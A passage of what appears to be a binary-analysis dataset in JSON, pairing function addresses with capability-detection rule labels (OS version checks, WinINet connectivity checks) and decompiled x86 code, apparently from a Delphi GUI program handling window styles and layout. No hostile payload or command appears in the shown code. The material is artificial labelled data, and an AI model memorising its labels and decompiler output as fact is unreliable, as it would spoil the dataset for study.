            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470fcc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x1ad)) && (*(in_EAX + 0x1ad) = param_2,  in_EAX[0x6d] != 0)) {\n        (**(*in_EAX + 0x9c))();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "004712d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004712d0(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_14h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.00468658();\n    *(in_EAX + 0x50) = *0x4714f4;\n    fcn.00444c6c();\n    fcn.00444ca0();\n    fcn.004448f8();\n    fcn.004686bc();\n    *(in_EAX + 0x260) = 0x17;\n    *(in_EAX + 0x264) = 0x16;\n    *(in_EAX + 0x275) = 0;\n    *(in_EAX + 0x276) = 0;\n    *(in_EAX + 0x2b0) = 1;\n    *(in_EAX + 0x292) = 1;\n    uVar2 = fcn.00403f28();\n    *(in_EAX + 0x268) = uVar2;\n    uVar2 = fcn.00421624();\n    *(in_EAX + 0x270) = uVar2;\n    fcn.00443e20();\n    iVar3 = fcn.00403f28();\n    *(in_EAX + 0x298) = iVar3;\n    *(iVar3 + 0xc) = in_EAX;\n    *(iVar3 + 8) = 0x472914;\n    iVar3 = fcn.00403f28();\n    *(in_EAX + 0x2a0) = iVar3;\n    *(iVar3 + 0xc) = in_EAX;\n    *(iVar3 + 8) = 0x4729bc;\n    iVar3 = fcn.00403f28();\n    *(in_EAX + 0x2a8) = iVar3;\n    *(iVar3 + 0xc) = in_EAX;\n    *(iVar3 + 8) = 0x472a64;\n    piVar4 = fcn.00426010();\n    *(in_EAX + 0x2b4) = piVar4;\n    (**(*piVar4 + 0x40))();\n    (**(*piVar4 + 0x34))();\n    fcn.004265e4();\n    fcn.004214d4();\n    arg_8h = &var_14h;\n    fcn.00406c18(arg_8h, 1);\n    fcn.004265e4(&var_14h);\n    fcn.00421878();\n    *(in_EAX + 0xac) = *0x4684ac;\n    fcn.00437d14();\n    uVar1 = fcn.00437e1c();\n    *(in_EAX + 0x290) = uVar1;\n    uVar2 = fcn.00426010();\n    *(in_EAX + 600) = uVar2;\n    fcn.0047584c();\n    fcn.00430810();\n    fcn.00475824();\n    *(in_EAX + 0x284) = 0xefd3c6;\n    fcn.004725c4();\n    fcn.004757c4();\n    fcn.00476780();\n    fcn.004757fc();\n    *(in_EAX + 0x28c) = 0xffffffff;\n    if (var_1h != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 918
    },
    "00471a20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471a20(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x2c0) < 1)) {\n        puStack20 = 0x471a48;\n        fcn.00472ea8();\n        uStack24 = 0x471a8a;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        iVar1 = fcn.00472ef4();\n        iVar2 = param_2 - (iVar1 + -1);\n        if (iVar2 == 0 || param_2 < iVar1 + -1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.004718bc();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x471a91;\n        uStack24 = 0x471a89;\n        fcn.00472eb0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "00471b70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471b70(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x264)) {\n        *(in_EAX + 0x264) = param_2;\n        fcn.00437d14();\n        cVar1 = fcn.00437e1c();\n        if (cVar1 == '\\x01') {\n            fcn.00449ecc();\n        }\n        fcn.00472c98();\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00471ba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471ba0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x260)) {\n        *(in_EAX + 0x260) = param_2;\n        fcn.00437d14();\n        cVar1 = fcn.00437e1c();\n        if (cVar1 == '\\x01') {\n            fcn.00449ecc();\n        }\n        fcn.00472c98();\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "0047216c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0047216c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x2c0) == 0)) {\n        puStack24 = 0x47219d;\n        fcn.00472ea8();\n        uStack28 = 0x472261;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uStack36 = 0xfffffff0;\n        uStack40 = 0x4721b5;\n        puStack24 = &stack0xfffffffc;\n        uStack40 = fcn.0044d1c8();\n        uStack44 = 0x4721bb;\n        uVar2 = sub.user32.dll_GetWindowLongA();\n        uStack44 = uVar2 & 0xefffffff;\n        uStack48 = 0xfffffff0;\n        uStack52 = 0x4721d1;\n        uStack52 = fcn.0044d1c8();\n        puStack56 = 0x4721d7;\n        sub.user32.dll_SetWindowLongA();\n        uStack60 = 0x472244;\n        iStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        iVar3 = fcn.00472ef4();\n        if (param_2 < iVar3) {\n            in_stack_ffffffb8 = 0x472201;\n            cVar1 = fcn.00471d1c(param_2);\n            if (cVar1 != '\\0') {\n                fcn.00471d1c(param_2);\n                in_stack_ffffffb8 = param_2;\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        iStack64 = 0x47224b;\n        uVar4 = fcn.0044d1c8(0xfffffff0, uVar2);\n        uVar4 = sub.user32.dll_SetWindowLongA(uVar4);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 634
    },
    "00472278": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472278(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint32_t uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint32_t uStack40;\n    uint uStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x2c0) < 1)) {\n        puStack20 = 0x4722a9;\n        fcn.00472ea8();\n        uStack24 = 0x472366;\n        iStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        uStack32 = 0x4722bf;\n        puStack20 = &stack0xfffffffc;\n        fcn.0044d1a4();\n        uStack32 = 0xfffffff0;\n        uStack36 = 0x4722c9;\n        uStack36 = fcn.0044d1c8();\n        uStack40 = 0x4722cf;\n        uVar1 = sub.user32.dll_GetWindowLongA();\n        uStack40 = uVar1 & 0xefffffff;\n        uStack44 = 0xfffffff0;\n        uStack48 = 0x4722e5;\n        uStack48 = fcn.0044d1c8();\n        puStack52 = 0x4722eb;\n        sub.user32.dll_SetWindowLongA();\n        uStack56 = 0x472349;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        iVar2 = fcn.00472ef4();\n        if (param_2 < iVar2) {\n            fcn.00471f44(param_2);\n        }\n        else {\n            fcn.00471d1c(param_2);\n        }\n        *in_FS_OFFSET = param_2;\n        uStack56 = 0x472350;\n        uStack60 = uVar1;\n        uVar3 = fcn.0044d1c8(0xfffffff0);\n        sub.user32.dll_SetWindowLongA(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 594
    },
    "00472b20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472b20(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x344)) {\n        if ((*(in_EAX + 0x50) & 1) != 0) {\n            *(in_EAX + 0x50) = *0x472c94;\n            puStack24 = 0x472b4c;\n            fcn.00449ecc();\n        }\n        puStack24 = 0x472b55;\n        fcn.00472518();\n        if (*(in_EAX + 0x344) != 0) {\n            puStack24 = 0x472b65;\n            iVar1 = fcn.00472594();\n            iVar1 = iVar1 + -1;\n            if (-1 < iVar1) {\n                do {\n                    puStack24 = 0x472b76;\n                    fcn.0047257c();\n                    puStack24 = 0x472b7b;\n                    fcn.00403f58();\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != -1);\n            }\n        }\n        if (*(in_EAX + 0x344) != 0) {\n            puStack24 = 0x472b92;\n            fcn.0041b820();\n        }\n        *(in_EAX + 0x344) = param_2;\n        if (param_2 != 0) {\n            puStack24 = 0x472ba9;\n            fcn.0041b5e0();\n            puStack24 = 0x472bb0;\n            iVar1 = fcn.00472594();\n            puStack24 = 0x472bc0;\n            iVar2 = fcn.0043c3c4();\n            if (iVar1 <= iVar2 + -1) {\n                iVar1 = ((iVar2 + -1) - iVar1) + 1;\n                do {\n                    puStack24 = 0x472bda;\n                    piVar3 = fcn.0047038c();\n                    uStack28 = 0x472c33;\n                    uStack32 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffe0;\n                    puStack24 = &stack0xfffffffc;\n                    (**(*piVar3 + 0x60))();\n                    fcn.00470d48();\n                    (**(*piVar3 + 0x6c))();\n                    uVar4 = fcn.0043c3d4();\n                    fcn.0047257c(uVar4);\n                    fcn.00470e70();\n                    *in_FS_OFFSET = uStack32;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            puStack24 = 0x472c60;\n            iVar1 = fcn.0043c3c4();\n            if (-1 < iVar1 + -1) {\n                do {\n                    puStack24 = 0x472c7a;\n                    puStack24 = fcn.0043c3d4();\n                    uStack28 = 0x472c84;\n                    fcn.0047257c();\n                    puStack24 = 0x472c8a;\n                    fcn.00470e70();\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 817
    },
    "00472dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00472dc0(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x344) == 0) {\n        iVar2 = *(*(in_EAX + 0x268) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                fcn.00414eec();\n                (*arg_8h)();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.00449558();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar1 = fcn.0044951c();\n                if ((*(iVar1 + 4) == in_EDX) && (iVar1 = fcn.00414f48(),  iVar1 == -1)) {\n                    (*arg_8h)();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00472eb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00472eb8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            fcn.00446870(0);\n            if (*(in_EAX + 0x5c) != '\\0') {\n                fcn.00404154();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00472f04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00472f04(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_3ch;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((in_EDX < 0) || (uVar5 = in_EDX,  1 < *(*(in_EAX + 0x268) + 8))) && (uVar5 = 0,  *(*(in_EAX + 0x268) + 8) != 0)\n       ) {\n        var_ch = 0;\n        var_10h = 0;\n        var_14h = 0;\n        var_8h = 0x7fffffff;\n        var_4h = in_ECX;\n        for (; (0 < var_8h && (uVar5 < *(*(in_EAX + 0x268) + 8))); uVar5 = uVar5 + 1) {\n            uVar2 = uVar5;\n            if (in_EDX != uVar5) {\n                var_18h = fcn.00414eec();\n                cVar1 = fcn.004040e4();\n                if (((cVar1 != '\\0') && (*(var_18h + 0x1ad) != '\\0')) ||\n                   (uVar2 = var_14h,  uVar5 == *(*(in_EAX + 0x268) + 8) - 1U)) {\n                    uVar2 = arg_8h - *(var_18h + 0x44);\n                    uVar4 = uVar2 >> 0x1f;\n                    if ((uVar2 ^ uVar4) - uVar4 < var_8h) {\n                        uVar2 = arg_8h - *(var_18h + 0x44);\n                        uVar4 = uVar2 >> 0x1f;\n                        var_8h = (uVar2 ^ uVar4) - uVar4;\n                        var_10h = var_ch;\n                        var_14h = uVar5;\n                    }\n                    var_ch = uVar5 + 1;\n                    uVar2 = var_14h;\n                }\n            }\n            var_14h = uVar2;\n        }\n        uVar5 = var_10h;\n        if (var_10h <= var_14h) {\n            var_1ch = (var_14h - var_10h) + 1;\n            do {\n                if ((in_EDX != uVar5) && (iVar3 = fcn.00414eec(),  var_4h <= *(iVar3 + 0x40))) break;\n                uVar5 = uVar5 + 1;\n                var_1ch = var_1ch + -1;\n            } while (var_1ch != 0);\n        }\n        if (uVar5 == in_EDX + 1) {\n            fcn.004039e4();\n            bVar6 = in_EDX < 0xff;\n            if (in_EDX < 0x100) {\n                bVar6 = (*(&var_3ch + (in_EDX >> 3)) >> (in_EDX & 7) & 1) != 0;\n            }\n            if (bVar6) {\n                uVar5 = in_EDX;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 850
    },
    "00473488": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473488(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_28h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *in_EAX = 0;\n    *in_EDX = 0;\n    var_10h = *(*(arg_8h + -4) + 0x2ac);\n    var_14h = 0;\n    iVar5 = *(*(*(arg_8h + -4) + 0x268) + 8);\n    var_8h = in_EDX;\n    if (-1 < iVar5 + -1) {\n        iVar4 = 0;\n        var_4h = in_EAX;\n        do {\n            iVar2 = fcn.00414eec();\n            var_18h = *(iVar2 + 0x48);\n            if (((*(*(arg_8h + -4) + 0x1c) & 0x10) != 0) || (*(iVar2 + 0x57) != '\\0')) {\n                cVar1 = fcn.004040e4();\n                if ((cVar1 == '\\0') || (*(*(*(arg_8h + -4) + 0x268) + 8) + -1 <= iVar4)) {\n                    var_9h = '\\0';\n                }\n                else if (*(arg_8h + -8) == 0) {\n                    var_9h = *(iVar2 + 0x1ad);\n                }\n                else {\n                    var_9h = fcn.00415448();\n                }\n                cVar1 = fcn.004040e4();\n                iVar3 = var_18h;\n                if ((cVar1 == '\\0') || (1 < *(iVar2 + 0x1ae) - 3U)) {\n                    cVar1 = fcn.004040e4();\n                    if ((cVar1 != '\\0') && (*(iVar2 + 0x1ae) == '\\x02')) {\n                        iVar2 = fcn.00446870(&var_28h);\n                        if (iVar2 == 0) {\n                            var_18h = var_18h + 0xd;\n                        }\n                        else {\n                            var_18h = var_20h - var_28h;\n                        }\n                    }\n                    if (*var_4h < var_10h + var_18h) {\n                        *var_4h = var_10h + var_18h;\n                    }\n                    iVar2 = *(*(arg_8h + -4) + 0x264) + var_14h;\n                    if (*var_8h < iVar2) {\n                        *var_8h = iVar2;\n                    }\n                }\n                else {\n                    iVar2 = fcn.0046cb64();\n                    if (iVar2 < 0x40047) {\ncode_r0x004735a5:\n                        iVar3 = (iVar3 * 2) / 3;\n                    }\n                    else if (*(*(arg_8h + -4) + 0x28a) == '\\0') {\n                        iVar2 = fcn.0046cb64();\n                        if (0x40047 < iVar2) goto code_r0x004735a5;\n                    }\n                    if ((var_9h == '\\0') || (*(*(*(arg_8h + -4) + 0x268) + 8) + -1 <= iVar4)) {\n                        if (*var_4h < var_10h + var_18h) {\n                            *var_4h = var_10h + var_18h;\n                        }\n                    }\n                    else {\n                        iVar2 = *(*(arg_8h + -4) + 0x264) + var_14h + iVar3;\n                        if (*var_8h < iVar2) {\n                            *var_8h = iVar2;\n                        }\n                    }\n                    if (var_9h != '\\0') {\n                        var_14h = var_14h + iVar3;\n                    }\n                }\n                if (var_9h == '\\0') {\n                    var_10h = var_10h + var_18h;\n                }\n                else {\n                    var_10h = *(*(arg_8h + -4) + 0x2ac);\n                    var_14h = var_14h + *(*(arg_8h + -4) + 0x264);\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if ((0 < *var_8h) && (*(*(arg_8h + -4) + 0x28a) == '\\0')) {\n        *var_8h = *var_8h + 2;\n    }\n    return;\n}\n",
        "token_count": 1154
    },
    "004736d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004736d4(int32_t arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 1;\n    var_ch = *(*(arg_8h + -4) + 0x2ac);\n    iVar6 = 0;\n    do {\n        if (*(*(*(arg_8h + -4) + 0x268) + 8) <= iVar6) {\n            return var_8h;\n        }\n        iVar3 = fcn.00414eec();\n        cVar2 = fcn.004040e4();\n        if (cVar2 != '\\0') {\n            fcn.0041541c();\n        }\n        if (((*(*(arg_8h + -4) + 0x1c) & 0x10) != 0) || (*(iVar3 + 0x57) != '\\0')) {\n            if (in_EAX < var_ch + *(iVar3 + 0x48)) {\n                cVar2 = fcn.004040e4();\n                if ((cVar2 == '\\0') || (1 < *(iVar3 + 0x1ae) - 3U)) {\n                    bVar1 = false;\n                    iVar5 = iVar6;\n                    if (-1 < iVar6) {\n                        do {\n                            fcn.00414eec();\n                            cVar2 = fcn.004040e4();\n                            if (cVar2 != '\\0') {\n                                iVar4 = fcn.00414eec();\n                                if ((((*(iVar4 + 0x1c) & 0x10) != 0) || (*(iVar4 + 0x57) != '\\0')) &&\n                                   (*(iVar4 + 0x1ae) - 3U < 2)) {\n                                    cVar2 = fcn.00415448();\n                                    if (cVar2 == '\\0') {\n                                        bVar1 = true;\n                                        var_ch = *(*(arg_8h + -4) + 0x2ac);\n                                        fcn.0041541c();\n                                        var_8h = var_8h + 1;\n                                        iVar6 = iVar5;\n                                    }\n                                    break;\n                                }\n                            }\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != -1);\n                    }\n                    if (!bVar1) {\n                        iVar5 = iVar6 + -1;\n                        if (-1 < iVar5) {\n                            do {\n                                fcn.00414eec();\n                                cVar2 = fcn.004040e4();\n                                if (cVar2 != '\\0') {\n                                    iVar4 = fcn.00414eec();\n                                    if (((*(iVar4 + 0x1c) & 0x10) != 0) || (*(iVar4 + 0x57) != '\\0')) {\n                                        cVar2 = fcn.00415448();\n                                        if (cVar2 == '\\0') {\n                                            bVar1 = true;\n                                            var_ch = *(*(arg_8h + -4) + 0x2ac);\n                                            fcn.0041541c();\n                                            var_8h = var_8h + 1;\n                                            iVar6 = iVar5;\n                                        }\n                                        break;\n                                    }\n                                }\n                                iVar5 = iVar5 + -1;\n                            } while (iVar5 != -1);\n                        }\n                        if (!bVar1) {\n                            var_ch = var_ch + *(iVar3 + 0x48);\n                        }\n                    }\n                    goto code_r0x004738de;\n                }\n            }\n            var_ch = var_ch + *(iVar3 + 0x48);\n        }\ncode_r0x004738de:\n        iVar6 = iVar6 + 1;\n    } while( true );\n}\n",
        "token_count": 886
    },
    "00473abc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00473abc(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *in_FS_OFFSET;\n    bool bVar9;\n    uint uStack88;\n    uint uStack84;\n    uint var_35h;\n    uint var_31h;\n    int32_t var_2dh;\n    int32_t var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar2 = fcn.0044d568();\n    if ((cVar2 != '\\0') && ((iVar3 = fcn.00472ef4(),  -1 < iVar3 + -1 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        iVar4 = fcn.00444f18();\n        iVar5 = fcn.00444f5c();\n        iVar3 = *(in_EAX + 0x48);\n        iVar1 = *(in_EAX + 0x4c);\n        uStack84 = 0x473b49;\n        fcn.00473488(&stack0xfffffffc);\n        fcn.00406c34();\n        if (*(in_EAX + 0x5b) == '\\0') {\n            uVar7 = var_2dh - iVar4 >> 0x1f;\n            uVar8 = var_29h - iVar5 >> 0x1f;\n            bVar9 = (var_2dh - iVar4 ^ uVar7) - uVar7 < (var_29h - iVar5 ^ uVar8) - uVar8;\n        }\n        else {\n            bVar9 = *(in_EAX + 0x5b) - 3U < 2;\n        }\n        if (*(in_EAX + 0x292) != '\\0') {\n            iVar3 = fcn.00403f28();\n            uStack84 = 0x473ca2;\n            uStack88 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffa8;\n            fcn.00415378();\n            if (bVar9) {\n                fcn.00473900(&stack0xfffffffc);\n            }\n            else {\n                fcn.00473a1c(&stack0xfffffffc);\n            }\n            fcn.00473488(&stack0xfffffffc);\n            if ((((bVar9) || (*(in_EAX + 0x5b) == '\\0')) && (var_2dh != iVar4)) || (var_29h != iVar5)) {\n                iVar3 = *(iVar3 + 4);\n                if (-1 < iVar3 + -1) {\n                    do {\n                        fcn.00414eec();\n                        cVar2 = fcn.004040e4();\n                        if (cVar2 != '\\0') {\n                            uVar6 = fcn.00415448();\n                            fcn.00414eec(uVar6);\n                            fcn.00470fcc();\n                        }\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                fcn.00471a20();\n            }\n            else {\n                fcn.004724d4();\n            }\n            *in_FS_OFFSET = uStack88;\n            uStack84 = 0x473ca1;\n            uVar6 = fcn.00403f58();\n            return uVar6;\n        }\n        uStack84 = 0x473cb5;\n        fcn.00473488(&stack0xfffffffc);\n        if ((*(in_EAX + 0x5c) != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n            if ((bVar9) || (*(in_EAX + 0x5b) == '\\0')) {\n                *param_2 = var_2dh + (iVar3 - iVar4);\n            }\n            if ((!bVar9) || (*(in_EAX + 0x5b) == '\\0')) {\n                *param_1 = var_29h + (iVar1 - iVar5);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1000
    },
    "00473d78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00473d78(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00458424();\n    if ((iVar2 == 0) || (*(**0x492ce0 + 100) == 0)) {\n        uVar3 = 0;\n    }\n    else {\n        if ((iVar2 != *(**0x492ce0 + 100)) && (cVar1 = fcn.004492c0(),  cVar1 == '\\0')) {\n            return 0;\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 152
    },
    "00473dcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
